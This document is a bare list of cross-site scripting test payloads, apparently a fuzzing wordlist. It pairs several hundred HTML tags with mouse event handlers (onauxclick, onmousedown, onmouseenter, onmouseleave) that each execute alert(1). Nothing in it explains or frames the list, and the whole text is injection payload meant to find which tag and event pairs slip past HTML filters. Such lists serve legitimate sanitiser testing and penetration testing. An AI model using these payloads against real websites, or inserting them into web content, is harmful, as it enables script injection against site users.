<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<iframe onmousedown="alert(1)">test</iframe>
<image onmousedown="alert(1)">test</image>
<img onmousedown="alert(1)">test</img>
<input onmousedown="alert(1)">test</input>
<ins onmousedown="alert(1)">test</ins>
<isindex onmousedown="alert(1)">test</isindex>
<kbd onmousedown="alert(1)">test</kbd>
<keygen onmousedown="alert(1)">test</keygen>
<label onmousedown="alert(1)">test</label>
<legend onmousedown="alert(1)">test</legend>
<li onmousedown="alert(1)">test</li>
<link onmousedown="alert(1)">test</link>
<listing onmousedown="alert(1)">test</listing>
<main onmousedown="alert(1)">test</main>
<map onmousedown="alert(1)">test</map>
<mark onmousedown="alert(1)">test</mark>
<marquee onmousedown="alert(1)">test</marquee>
<menu onmousedown="alert(1)">test</menu>
<menuitem onmousedown="alert(1)">test</menuitem>
<meta onmousedown="alert(1)">test</meta>
<meter onmousedown="alert(1)">test</meter>
<multicol onmousedown="alert(1)">test</multicol>
<nav onmousedown="alert(1)">test</nav>
<nextid onmousedown="alert(1)">test</nextid>
<nobr onmousedown="alert(1)">test</nobr>
<noembed onmousedown="alert(1)">test</noembed>
<noframes onmousedown="alert(1)">test</noframes>
<noscript onmousedown="alert(1)">test</noscript>
<object onmousedown="alert(1)">test</object>
<ol onmousedown="alert(1)">test</ol>
<optgroup onmousedown="alert(1)">test</optgroup>
<option onmousedown="alert(1)">test</option>
<output onmousedown="alert(1)">test</output>
<p onmousedown="alert(1)">test</p>
<param onmousedown="alert(1)">test</param>
<picture onmousedown="alert(1)">test</picture>
<plaintext onmousedown="alert(1)">test</plaintext>
<pre onmousedown="alert(1)">test</pre>
<progress onmousedown="alert(1)">test</progress>
<q onmousedown="alert(1)">test</q>
<rb onmousedown="alert(1)">test</rb>
<rp onmousedown="alert(1)">test</rp>
<rt onmousedown="alert(1)">test</rt>
<rtc onmousedown="alert(1)">test</rtc>
<ruby onmousedown="alert(1)">test</ruby>
<s onmousedown="alert(1)">test</s>
<samp onmousedown="alert(1)">test</samp>
<script onmousedown="alert(1)">test</script>
<section onmousedown="alert(1)">test</section>
<select onmousedown="alert(1)">test</select>
<shadow onmousedown="alert(1)">test</shadow>
<slot onmousedown="alert(1)">test</slot>
<small onmousedown="alert(1)">test</small>
<source onmousedown="alert(1)">test</source>
<spacer onmousedown="alert(1)">test</spacer>
<span onmousedown="alert(1)">test</span>
<strike onmousedown="alert(1)">test</strike>
<strong onmousedown="alert(1)">test</strong>
<style onmousedown="alert(1)">test</style>
<sub onmousedown="alert(1)">test</sub>
<summary onmousedown="alert(1)">test</summary>
<sup onmousedown="alert(1)">test</sup>
<svg onmousedown="alert(1)">test</svg>
<table onmousedown="alert(1)">test</table>
<tbody onmousedown="alert(1)">test</tbody>
<td onmousedown="alert(1)">test</td>
<template onmousedown="alert(1)">test</template>
<textarea onmousedown="alert(1)">test</textarea>
<tfoot onmousedown="alert(1)">test</tfoot>
<th onmousedown="alert(1)">test</th>
<thead onmousedown="alert(1)">test</thead>
<time onmousedown="alert(1)">test</time>
<title onmousedown="alert(1)">test</title>
<tr onmousedown="alert(1)">test</tr>
<track onmousedown="alert(1)">test</track>
<tt onmousedown="alert(1)">test</tt>
<u onmousedown="alert(1)">test</u>
<ul onmousedown="alert(1)">test</ul>
<var onmousedown="alert(1)">test</var>
<video onmousedown="alert(1)">test</video>
<wbr onmousedown="alert(1)">test</wbr>
<xmp onmousedown="alert(1)">test</xmp>
<xss onmouseenter="alert(1)">test</xss>
<a onmouseenter="alert(1)">test</a>
<abbr onmouseenter="alert(1)">test</abbr>
<acronym onmouseenter="alert(1)">test</acronym>
<address onmouseenter="alert(1)">test</address>
<applet onmouseenter="alert(1)">test</applet>
<area onmouseenter="alert(1)">test</area>
<article onmouseenter="alert(1)">test</article>
<aside onmouseenter="alert(1)">test</aside>
<audio onmouseenter="alert(1)">test</audio>
<b onmouseenter="alert(1)">test</b>
<base onmouseenter="alert(1)">test</base>
<basefont onmouseenter="alert(1)">test</basefont>
<bdi onmouseenter="alert(1)">test</bdi>
<bdo onmouseenter="alert(1)">test</bdo>
<bgsound onmouseenter="alert(1)">test</bgsound>
<big onmouseenter="alert(1)">test</big>
<blink onmouseenter="alert(1)">test</blink>
<blockquote onmouseenter="alert(1)">test</blockquote>
<body onmouseenter="alert(1)">test</body>
<br onmouseenter="alert(1)">test</br>
<button onmouseenter="alert(1)">test</button>
<canvas onmouseenter="alert(1)">test</canvas>
<caption onmouseenter="alert(1)">test</caption>
<center onmouseenter="alert(1)">test</center>
<cite onmouseenter="alert(1)">test</cite>
<code onmouseenter="alert(1)">test</code>
<col onmouseenter="alert(1)">test</col>
<colgroup onmouseenter="alert(1)">test</colgroup>
<command onmouseenter="alert(1)">test</command>
<content onmouseenter="alert(1)">test</content>
<data onmouseenter="alert(1)">test</data>
<datalist onmouseenter="alert(1)">test</datalist>
<dd onmouseenter="alert(1)">test</dd>
<del onmouseenter="alert(1)">test</del>
<details onmouseenter="alert(1)">test</details>
<dfn onmouseenter="alert(1)">test</dfn>
<dialog onmouseenter="alert(1)">test</dialog>
<dir onmouseenter="alert(1)">test</dir>
<div onmouseenter="alert(1)">test</div>
<dl onmouseenter="alert(1)">test</dl>
<dt onmouseenter="alert(1)">test</dt>
<element onmouseenter="alert(1)">test</element>
<em onmouseenter="alert(1)">test</em>
<embed onmouseenter="alert(1)">test</embed>
<fieldset onmouseenter="alert(1)">test</fieldset>
<figcaption onmouseenter="alert(1)">test</figcaption>
<figure onmouseenter="alert(1)">test</figure>
<font onmouseenter="alert(1)">test</font>
<footer onmouseenter="alert(1)">test</footer>
<form onmouseenter="alert(1)">test</form>
<frame onmouseenter="alert(1)">test</frame>
<frameset onmouseenter="alert(1)">test</frameset>
<h1 onmouseenter="alert(1)">test</h1>
<head onmouseenter="alert(1)">test</head>
<header onmouseenter="alert(1)">test</header>
<hgroup onmouseenter="alert(1)">test</hgroup>
<hr onmouseenter="alert(1)">test</hr>
<html onmouseenter="alert(1)">test</html>
<i onmouseenter="alert(1)">test</i>
<iframe onmouseenter="alert(1)">test</iframe>
<image onmouseenter="alert(1)">test</image>
<img onmouseenter="alert(1)">test</img>
<input onmouseenter="alert(1)">test</input>
<ins onmouseenter="alert(1)">test</ins>
<isindex onmouseenter="alert(1)">test</isindex>
<kbd onmouseenter="alert(1)">test</kbd>
<keygen onmouseenter="alert(1)">test</keygen>
<label onmouseenter="alert(1)">test</label>
<legend onmouseenter="alert(1)">test</legend>
<li onmouseenter="alert(1)">test</li>
<link onmouseenter="alert(1)">test</link>
<listing onmouseenter="alert(1)">test</listing>
<main onmouseenter="alert(1)">test</main>
<map onmouseenter="alert(1)">test</map>
<mark onmouseenter="alert(1)">test</mark>
<marquee onmouseenter="alert(1)">test</marquee>
<menu onmouseenter="alert(1)">test</menu>
<menuitem onmouseenter="alert(1)">test</menuitem>
<meta onmouseenter="alert(1)">test</meta>
<meter onmouseenter="alert(1)">test</meter>
<multicol onmouseenter="alert(1)">test</multicol>
<nav onmouseenter="alert(1)">test</nav>
<nextid onmouseenter="alert(1)">test</nextid>
<nobr onmouseenter="alert(1)">test</nobr>
<noembed onmouseenter="alert(1)">test</noembed>
<noframes onmouseenter="alert(1)">test</noframes>
<noscript onmouseenter="alert(1)">test</noscript>
<object onmouseenter="alert(1)">test</object>
<ol onmouseenter="alert(1)">test</ol>
<optgroup onmouseenter="alert(1)">test</optgroup>
<option onmouseenter="alert(1)">test</option>
<output onmouseenter="alert(1)">test</output>
<p onmouseenter="alert(1)">test</p>
<param onmouseenter="alert(1)">test</param>
<picture onmouseenter="alert(1)">test</picture>
<plaintext onmouseenter="alert(1)">test</plaintext>
<pre onmouseenter="alert(1)">test</pre>
<progress onmouseenter="alert(1)">test</progress>
<q onmouseenter="alert(1)">test</q>
<rb onmouseenter="alert(1)">test</rb>
<rp onmouseenter="alert(1)">test</rp>
<rt onmouseenter="alert(1)">test</rt>
<rtc onmouseenter="alert(1)">test</rtc>
<ruby onmouseenter="alert(1)">test</ruby>
<s onmouseenter="alert(1)">test</s>
<samp onmouseenter="alert(1)">test</samp>
<script onmouseenter="alert(1)">test</script>
<section onmouseenter="alert(1)">test</section>
<select onmouseenter="alert(1)">test</select>
<shadow onmouseenter="alert(1)">test</shadow>
<slot onmouseenter="alert(1)">test</slot>
<small onmouseenter="alert(1)">test</small>
<source onmouseenter="alert(1)">test</source>
<spacer onmouseenter="alert(1)">test</spacer>
<span onmouseenter="alert(1)">test</span>
<strike onmouseenter="alert(1)">test</strike>
<strong onmouseenter="alert(1)">test</strong>
<style onmouseenter="alert(1)">test</style>
<sub onmouseenter="alert(1)">test</sub>
<summary onmouseenter="alert(1)">test</summary>
<sup onmouseenter="alert(1)">test</sup>
<svg onmouseenter="alert(1)">test</svg>
<table onmouseenter="alert(1)">test</table>
<tbody onmouseenter="alert(1)">test</tbody>
<td onmouseenter="alert(1)">test</td>
<template onmouseenter="alert(1)">test</template>
<textarea onmouseenter="alert(1)">test</textarea>
<tfoot onmouseenter="alert(1)">test</tfoot>
<th onmouseenter="alert(1)">test</th>
<thead onmouseenter="alert(1)">test</thead>
<time onmouseenter="alert(1)">test</time>
<title onmouseenter="alert(1)">test</title>
<tr onmouseenter="alert(1)">test</tr>
<track onmouseenter="alert(1)">test</track>
<tt onmouseenter="alert(1)">test</tt>
<u onmouseenter="alert(1)">test</u>
<ul onmouseenter="alert(1)">test</ul>
<var onmouseenter="alert(1)">test</var>
<video onmouseenter="alert(1)">test</video>
<wbr onmouseenter="alert(1)">test</wbr>
<xmp onmouseenter="alert(1)">test</xmp>
<xss onmouseleave="alert(1)">test</xss>
<a onmouseleave="alert(1)">test</a>
<abbr onmouseleave="alert(1)">test</abbr>
<acronym onmouseleave="alert(1)">test</acronym>
<address onmouseleave="alert(1)">test</address>
<applet onmouseleave="alert(1)">test</applet>
<area onmouseleave="alert(1)">test</area>
<article onmouseleave="alert(1)">test</article>
<aside onmouseleave="alert(1)">test</aside>
<audio onmouseleave="alert(1)">test</audio>
<b onmouseleave="alert(1)">test</b>
<base onmouseleave="alert(1)">test</base>
<basefont onmouseleave="alert(1)">test</basefont>
<bdi onmouseleave="alert(1)">test</bdi>
<bdo onmouseleave="alert(1)">test</bdo>
<bgsound onmouseleave="alert(1)">test</bgsound>
<big onmouseleave="alert(1)">test</big>
<blink onmouseleave="alert(1)">test</blink>
<blockquote onmouseleave="alert(1)">test</blockquote>
<body onmouseleave="alert(1)">test</body>
<br onmouseleave="alert(1)">test</br>
<button onmouseleave="alert(1)">test</button>
<canvas onmouseleave="alert(1)">test</canvas>
<caption onmouseleave="alert(1)">test</caption>
<center onmouseleave="alert(1)">test</center>
<cite onmouseleave="alert(1)">test</cite>
<code onmouseleave="alert(1)">test</code>
<col onmouseleave="alert(1)">test</col>
<colgroup onmouseleave="alert(1)">test</colgroup>
<command onmouseleave="alert(1)">test</command>
<content onmouseleave="alert(1)">test</content>
<data onmouseleave="alert(1)">test</data>
<datalist onmouseleave="alert(1)">test</datalist>
<dd onmouseleave="alert(1)">test</dd>
<del onmouseleave="alert(1)">test</del>
<details onmouseleave="alert(1)">test</details>
<dfn onmouseleave="alert(1)">test</dfn>
<dialog onmouseleave="alert(1)">test</dialog>
<dir onmouseleave="alert(1)">test</dir>
<div onmouseleave="alert(1)">test</div>
<dl onmouseleave="alert(1)">test</dl>
<dt onmouseleave="alert(1)">test</dt>
<element onmouseleave="alert(1)">test</element>
<em onmouseleave="alert(1)">test</em>
<embed onmouseleave="alert(1)">test</embed>
<fieldset onmouseleave="alert(1)">test</fieldset>
<figcaption onmouseleave="alert(1)">test</figcaption>
<figure onmouseleave="alert(1)">test</figure>
<font onmouseleave="alert(1)">test</font>
<footer onmouseleave="alert(1)">test</footer>
<form onmouseleave="alert(1)">test</form>
<frame onmouseleave="alert(1)">test</frame>
<frameset onmouseleave="alert(1)">test</frameset>
<h1 onmouseleave="alert(1)">test</h1>
<head onmouseleave="alert(1)">test</head>
<header onmouseleave="alert(1)">test</header>
<hgroup onmouseleave="alert(1)">test</hgroup>
<hr onmouseleave="alert(1)">test</hr>
<html onmouseleave="alert(1)">test</html>
<i onmouseleave="alert(1)">test</i>
<iframe onmouseleave="alert(1)">test</iframe>
<image onmouseleave="alert(1)">test</image>
<img onmouseleave="alert(1)">test</img>
<input onmouseleave="alert(1)">test</input>
<ins onmouseleave="alert(1)">test</ins>
<isindex onmouseleave="alert(1)">test</isindex>
<kbd onmouseleave="alert(1)">test</kbd>
<keygen onmouseleave="alert(1)">test</keygen>
<label onmouseleave="alert(1)">test</label>
<legend onmouseleave="alert(1)">test</legend>
<li onmouseleave="alert(1)">test</li>
<link onmouseleave="alert(1)">test</link>
<listing onmouseleave="alert(1)">test</listing>
<main onmouseleave="alert(1)">test</main>
<map onmouseleave="alert(1)">test</map>
<mark onmouseleave="alert(1)">test</mark>
<marquee onmouseleave="alert(1)">test</marquee>
<menu onmouseleave="alert(1)">test</menu>
<menuitem onmouseleave="alert(1)">test</menuitem>
<meta onmouseleave="alert(1)">test</meta>
<meter onmouseleave="alert(1)">test</meter>
<multicol onmouseleave="alert(1)">test</multicol>
<nav onmouseleave="alert(1)">test</nav>
<nextid onmouseleave="alert(1)">test</nextid>
<nobr onmouseleave="alert(1)">test</nobr>
<noembed onmouseleave="alert(1)">test</noembed>
<noframes onmouseleave="alert(1)">test</noframes>
<noscript onmouseleave="alert(1)">test</noscript>
<object onmouseleave="alert(1)">test</object>
<ol onmouseleave="alert(1)">test</ol>
<optgroup onmouseleave="alert(1)">test</optgroup>
<option onmouseleave="alert(1)">test</option>
<output onmouseleave="alert(1)">test</output>
<p onmouseleave="alert(1)">test</p>
<param onmouseleave="alert(1)">test</param>
<picture onmouseleave="alert(1)">test</picture>
<plaintext onmouseleave="alert(1)">test</plaintext>
<pre onmouseleave="alert(1)">test</pre>
<progress onmouseleave="alert(1)">test</progress>
<q onmouseleave="alert(1)">test</q>
<rb onmouseleave="alert(1)">test</rb>
<rp onmouseleave="alert(1)">test</rp>
<rt onmouseleave="alert(1)">test</rt>
<rtc onmouseleave="alert(1)">test</rtc>
<ruby onmouseleave="alert(1)">test</ruby>
<s onmouseleave="alert(1)">test</s>
<samp onmouseleave="alert(1)">test</samp>
<script onmouseleave="alert(1)">test</script>
<section onmouseleave="alert(1)">test</section>
<select onmouseleave="alert(1)">test</select>
<shadow onmouseleave="alert(1)">test</shadow>
<slot onmouseleave="alert(1)">test</slot>
<small onmouseleave="alert(1)">test</small>
<source onmouseleave="alert(1)">test</source>
<spacer onmouseleave="alert(1)">test</spacer>
<span onmouseleave="alert(1)">test</span>
<strike onmouseleave="alert(1)">test</strike>
<strong onmouseleave="alert(1)">test</strong>
<style onmouseleave="alert(1)">test</style>
<sub onmouseleave="alert(1)">test</sub>
<summary onmouseleave="alert(1)">test</summary>
<sup onmouseleave="alert(1)">test</sup>
<svg onmouseleave="alert(1)">test</svg>
<table onmouseleave="alert(1)">test</table>
<tbody onmouseleave="alert(1)">test</tbody>
<td onmouseleave="alert(1)">test</td>
<template onmouseleave="alert(1)">test</template>
<textarea onmouseleave="alert(1)">test</textarea>
<tfoot onmouseleave="alert(1)">test</tfoot>
<th onmouseleave="alert(1)">test</th>
<thead onmouseleave="alert(1)">test</thead>
<time onmouseleave="alert(1)">test</time>
<title onmouseleave="alert(1)">test</title>
<tr onmouseleave="alert(1)">test</tr>
<track onmouseleave="alert(1)">test</track>
<tt onmouseleave="alert(1)">test</tt>
<u onmouseleave="alert(1)">test</u>
